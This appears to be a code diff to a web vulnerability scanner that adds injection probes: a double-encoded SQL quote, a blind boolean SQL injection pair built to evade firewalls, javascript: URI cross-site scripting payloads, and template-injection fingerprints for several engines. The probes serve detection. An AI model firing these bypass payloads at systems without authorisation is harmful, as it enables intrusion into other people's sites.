@@ -16,6 +16,10 @@ const ERROR_PROBES = [
   // quote on backslash-escaping sanitizers (Roundcube CVE-2026-48842 writeup,
   // Sep 2026), reopening the string → DBMS syntax error.
   "\\",
+  // community 2026-10-12: double-URL-encoded quote (WAF decoding-depth
+  // fingerprinting notes, Oct 2026) — if a decoder runs twice before the
+  // sink, %2527 becomes ' and reopens the string → syntax error signature.
+  "%2527",
 ];
 
 const BOOLEAN_PAIRS = [
@@ -27,6 +31,11 @@ const BOOLEAN_PAIRS = [
   // WAF-bypass notes) — catches filters that signature-block ascii()/mid().
   // DB-agnostic: only MySQL evaluates strcmp, others behave identically.
   ["' AND strcmp(left('aegis',1),'a')=0-- -", "' AND strcmp(left('aegis',1),'a')=1-- -"],
+  // community 2026-10-12: scientific-notation blind oracle (@ptswarm /
+  // GoSecure MySQL research, sqlmap 2026 tamper set) — 1e0=1 is TRUE,
+  // 1e1=1 is FALSE; slips past WAFs that only signature-block digit
+  // tautologies like 1=1.
+  ["' AND 1e0=1-- -", "' AND 1e1=1-- -"],
 ];
 
 // canary-based UNION confirmation: {cols, build(canary)}
@@ -171,9 +180,17 @@ const XSS_PROBES = [
   // Namespaced/custom element: slips past sanitizers that only strip known
   // tags, keeping the event handler live (SunEditor CVE-2026-59167 writeup).
   { name: "namespaced-tag", t: '<a:b src="/x" onclick={C}>click</a:b>', kinds: ["tag"] },
+  // --- community additions 2026-10-12 (web-indexed writeup roundup) ---
+  // javascript: URI in an anchor href — survives filters that only strip
+  // event handlers (PortSwigger XSS cheatsheet family).
+  { name: "html-a-href", t: '<a href="javascript:{C}">click me</a>', kinds: ["tag"] },
+  // javascript: URI as iframe src — no event handler needed at all.
+  { name: "html-iframe-src", t: '<iframe src="javascript:{C}">', kinds: ["tag"] },
+  // javascript: URI in form action — fires on submit via the Go button.
+  { name: "html-form-action", t: '<form action="javascript:{C}"><input type=submit value=go>', kinds: ["tag"] },
 ];
 
-const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 32 };
+const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 35 };
 
 /* ------------------------------------------------------------------ */
 /* SSTI — distinctive-math probes (detection only)                     */
@@ -198,6 +215,12 @@ const SSTI_PROBES = [
   // so no background.js change is needed.
   `#set($aegis=${SSTI_FACTOR_A}*${SSTI_FACTOR_B})$aegis`, // Apache Velocity
   `{if ${SSTI_FACTOR_A}*${SSTI_FACTOR_B}==${SSTI_EXPECTED}}${SSTI_EXPECTED}{/if}`, // Smarty3
+  // community 2026-10-12: three more engine fingerprints (bug-bounty SSTI
+  // skill roundups, Oct 2026) — all evaluate to SSTI_EXPECTED (9801547),
+  // so no background.js change is needed.
+  `[=${SSTI_FACTOR_A}*${SSTI_FACTOR_B}]`, // FreeMarker alt delimiter (2.3.4+)
+  `@(${SSTI_FACTOR_A}*${SSTI_FACTOR_B})`, // Razor explicit expression
+  `[[${"$"}{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}]]`, // Thymeleaf inline
 ];
 
 /* ------------------------------------------------------------------ */
